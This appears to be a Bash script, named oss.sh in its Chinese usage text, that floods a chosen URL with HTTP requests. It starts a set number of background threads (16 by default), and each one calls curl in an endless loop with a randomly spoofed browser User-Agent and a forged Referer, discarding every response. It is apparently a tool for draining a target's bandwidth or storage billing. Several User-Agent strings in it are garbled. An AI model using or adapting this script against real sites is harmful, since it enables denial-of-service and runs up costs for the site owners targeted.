#!/bin/bash

while getopts ":l:t:r:s" opt
do
    case $opt in
        l)
        l=$OPTARG
        ;;
        t)
        t=$OPTARG
        ;;
        r)
        r=$OPTARG
        ;;
        s)
        stop_
        ;;
        ?)
        echo -e "\e[93m[用法]\n\e[93m[下载] \e[92mcurl \e[91m-Lo \e[96moss.sh \e[96mgit.io/jhoss\e[0m"
        echo -e "\e[93m[参数] \e[91m-l \e[96m<链接> \e[91m-t \e[96m<线程数> \e[91m-r \e[96m<Referer> \e[91m-s \e[96m<终止>\n\e[0m"
        echo -e '\e[93m[示例0] \e[92mbash \e[96moss.sh \e[93m<按照提示输入参数> \e[0m'
        echo -e '\e[93m[示例1] \e[96moss.sh \e[91m-l \e[96m"https://www.baidu.com" \e[0m'
        echo -e '\e[93m[示例2] \e[96moss.sh \e[91m-l \e[96m"https://www.baidu.com" \e[91m-t \e[96m8 \e[0m'
        echo -e '\e[93m[示例3] \e[96moss.sh \e[91m-l \e[96m"https://www.baidu.com" \e[91m-t \e[96m8 \e[91m-r \e[96m"https://www.baidu.com"\e[0m'
		echo -e '\e[93m[示例4] \e[92mbash \e[96moss.sh \e[91m-s \n\e[0m'
        exit 1
        ;;
    esac
done

stop_()
{
kill -9 `ps -a |grep -v "grep" |grep -v "ps" |grep -v "oss.sh" |grep -E 'bash|curl' |awk '{print $1}'`
exit 1
}

get_link()
{
read -p $(echo -e "\e[93m输入[链接]开始或输入[s]停止：\e[96m") l
case $l in
	[Ss]*)
		echo -e "\e[0m"
		stop_
		;;
	*)
	echo "继续"
	;;
esac

echo -e "\e[93m链接为\e[91m $l \e[93m是否确定[Y]？\e[0m" 
read ll
case $ll in
	[Yy]*)
		echo "开始"
		;;	
	*)
		echo "退出"
		exit 1
		;;
esac
}

if [ ! -n "$l" ] ;then
	echo -e "\e[93m[用法]\n\e[93m[下载] \e[92mcurl \e[91m-Lo \e[96moss.sh \e[96mgit.io/jhoss\e[0m"
	echo -e "\e[93m[参数] \e[91m-l \e[96m<链接> \e[91m-t \e[96m<线程数> \e[91m-r \e[96m<Referer> \e[91m-s \e[96m<终止>\n\e[0m"
	echo -e '\e[93m[示例0] \e[92mbash \e[96moss.sh \e[93m<按照提示输入参数> \e[0m'
	echo -e '\e[93m[示例1] \e[92mbash \e[96moss.sh \e[91m-l \e[96m"https://www.baidu.com" \e[0m'
	echo -e '\e[93m[示例2] \e[92mbash \e[96moss.sh \e[91m-l \e[96m"https://www.baidu.com" \e[91m-t \e[96m8 \e[0m'
	echo -e '\e[93m[示例3] \e[92mbash \e[96moss.sh \e[91m-l \e[96m"https://www.baidu.com" \e[91m-t \e[96m8 \e[91m-r \e[96m"https://www.baidu.com"\e[0m'
	echo -e '\e[93m[示例4] \e[92mbash \e[96moss.sh \e[91m-s \n\e[0m'
	#exit 1
	get_link
fi

if [ ! -n "$t" ] ;then
	t=16
fi

if [ ! -n "$r" ] ;then
	r=$l
fi

UAs[0]="Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTMLUAs[0] like Gecko) Chrome/80.0.3987.163 Safari/537.36"
UAs[1]="Mozilla/5.0 (MSIE 10.0; Windows NT 6.1; Trident/5.0)"
UAs[2]="Mozilla/5.0 (MSIE 9.0; Windows NT 6.1; Trident/5.0)"
UAs[3]="Mozilla/5.0 (iPad; CPU OS 6_0 like Mac OS X) AppleWebKit/536.26 (KHTMLUAs[0] like Gecko) Version/6.0 Mobile/10A5376e Safari/8536.25"
UAs[4]="Mozilla/5.0 (iPhone; CPU iPhone OS 6_0 like Mac OS X) AppleWebKit/536.26 (KHTMLUAs[0] like Gecko) Version/6.0 Mobile/10A5376e Safari/8536.25"
UAs[5]="Mozilla/5.0 (iPhone; CPU iPhone OS 6_0 like Mac OS X) AppleWebKit/536.26 (KHTMLUAs[0] like Gecko) Version/6.0 Mobile/10A5376e Safari/8536.25"
UAs[6]="Mozilla/5.0 (compatible; MSIE 10.0; Windows Phone 8.0; Trident/6.0; IEMobile/10.0; ARM; Touch; NOKIA; Lumia 920)"
UAs[7]="Mozilla/5.0 (Windows NT 6.1; WOW64; rv:33.0) Gecko/20120101 Firefox/33.0"
UAs[8]="Mozilla/5.0 (Macintosh; Intel Mac OS X 10_10; rv:33.0) Gecko/20100101 Firefox/33.0"
UAs[9]="Opera/9.80 (Windows NT 6.0) Presto/2.12.388 Version/12.14"
UAs[10]="Mozilla/5.0 (Macintosh; Intel Mac OS X 10_9_3) AppleWebKit/537.75.14 (KHTMLUAs[0] like Gecko) Version/7.0.3 Safari/7046A194A"

for i in $(seq 1 $t)
do
{
while true
do
z=$[$RANDOM%11]
#wget -O /dev/null -o /dev/null -UA=${UAs[$z]} $l 1> /dev/null 2>&1
curl -Lo /dev/null -A ${UAs[$z]} $l 1> /dev/null 2>&1
done
}&
echo "thread $i start!"
done
